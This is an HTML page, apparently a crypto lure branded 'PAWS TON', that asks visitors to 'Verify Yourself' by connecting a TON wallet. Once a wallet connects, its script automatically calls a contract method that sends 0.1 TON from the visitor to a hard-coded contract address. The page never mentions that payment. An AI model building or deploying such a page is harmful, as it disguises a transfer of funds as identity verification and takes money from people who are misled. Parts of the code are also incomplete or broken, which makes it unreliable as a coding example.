<!DOCTYPE html>
<html>
<head>
    <base href="https://hasan199191.github.io/my-ton-app/">
    <meta charset="utf-8">
    <title>PAWS TON | Home</title>
    <style>
        :root {
            --primary-color: #FF6B6B;
            --background: #0D0D0D;
            --text: #ffffff;
        }

        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--background);
            color: var(--text);
            overflow-x: hidden;
        }

        .verify-section {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            position: relative;
            z-index: 1;
            padding: 2rem;
        }

        .shape {
            position: absolute;
            pointer-events: none;
            z-index: 0;
        }

        .shape1 { top: 0; left: 0; }
        .shape2 { top: 20%; right: 0; }
        .shape3 { bottom: 20%; left: 0; }
        .shape4 { bottom: 0; right: 0; }

        .verify-title {
            font-size: 3.5rem;
            margin-bottom: 1.5rem;
            z-index: 2;
        }

        .verify-description {
            font-size: 1.2rem;
            max-width: 600px;
            margin-bottom: 3rem;
            z-index: 2;
        }

        #ton-connect-button {
            z-index: 2;
            margin-top: 2rem;
        }

        .wallet-container {
            padding: 1rem;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            backdrop-filter: blur(10px);
            z-index: 2;
        }
    </style>
</head>
<body>
    <section class="verify-section">
        <img src="assets/shape1.png" class="shape shape1" alt="">
        <img src="assets/shape2.png" class="shape shape2" alt="">
        <img src="assets/shape3.png" class="shape shape3" alt="">
        <img src="assets/shape4.png" class="shape shape4" alt="">
        
        <h1 class="verify-title">Verify Yourself</h1>
        <p class="verify-description">Connect your TON wallet to verify your identity and access exclusive features.</p>
        <div class="wallet-container">
            <div id="ton-connect-button"></div>
        </div>
    </section>

    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ton-inpage-provider@0.1.30/dist/index.min.js"></script>
    <script>
        const CONTRACT_ADDRESS = "EQA0i8-CdGnF_DhUHHf92R1ONH6sIA9vLZ_WLcCIhfBBXwtG";

        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                if (window.TONConnect) {
                    const tonConnectUI = new window.TONConnect.UI({
                        manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
                        buttonRootId: 'ton-connect-button'
                    });

                    // Handle wallet connection
                    tonConnectUI.onStatusChange(async (wallet) => {
                        if (wallet) {
                            try {
                                // Initialize contract
                                const provider = window.ton;
                                const contract = new provider.Contract({
                                    address: CONTRACT_ADDRESS,
                                    // Add your contract ABI here
                                });

                                // Call contract method
                                await contract.methods.verify().send({
                                    from: wallet.account.address,
                                    amount: '0.1', // TON amount
                                });
                            } catch (error) {
                                console.error("Contract interaction failed:", error);
                            }
                        }
                    });
                }
            }, 1000);
        });
    </script>
</body>
</html>
